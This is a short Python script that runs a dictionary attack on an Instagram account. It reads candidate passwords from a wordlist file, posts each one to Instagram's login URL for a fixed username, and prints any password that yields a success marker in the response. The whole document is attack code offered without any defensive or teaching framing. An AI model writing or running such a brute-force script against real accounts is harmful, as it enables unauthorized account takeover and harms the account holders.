import requests

url = "https://www.instagram.com/accounts/login/"
arg = open("pswd.txt", "r")

for line in arg:
    password = line.strip()
    http = requests.post(url, data={'username': 'account1', 'password': password, 'submit': 'submit'})
    content = http.content
    print(http.status_code)
    if b"upload" in content:
        print("Password Found: " + password)
        break
    else:
        print('Password Incorrect: ' + password)
